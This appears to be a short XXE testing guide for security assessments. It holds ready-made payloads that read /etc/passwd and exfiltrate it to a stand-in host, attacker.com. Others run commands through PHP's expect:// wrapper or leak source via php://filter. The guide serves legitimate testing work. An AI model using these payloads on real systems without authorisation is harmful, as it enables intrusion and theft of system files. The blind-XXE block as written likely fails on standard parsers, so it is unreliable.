---
name: xxe
description: XML external entities, OOB exfiltration, blind XXE
category: vulnerabilities
---

# XXE Testing

## Attack Surface
XXE occurs when XML parsers process external entities from untrusted input.
- XML file uploads
- SOAP/Web service endpoints
- XML-RPC APIs
- SVG file uploads
- DOCX/XLSX parsers
- RSS/Atom feed consumers

## Methodology
1. **Detection**
   - Classic: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`
   - Out-of-band: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/data">]>`
   - Error-based: Cause XML parse errors that leak file contents
   - Blind: Use parameter entities for OOB exfiltration

2. **Blind XXE**
   ```xml
   <!DOCTYPE foo [
     <!ENTITY % xxe SYSTEM "file:///etc/passwd">
     <!ENTITY % callhome SYSTEM "http://attacker.com/?data=%xxe;">
     %callhome;
   ]>
   ```

3. **Advanced Techniques**
   - XInclude: `<xi:include href="file:///etc/passwd" parse="text"/>`
   - SVG XXE: embedded in SVG files for stored XSS + XXE
   - PHP wrapper: `expect://id`, `php://filter/convert.base64-encode/resource=index.php`
   - SSRF via XXE: target internal services with SYSTEM entity

## Validation
- File contents returned in response body
- OOB callback received with exfiltrated data
- Internal service response received via XXE
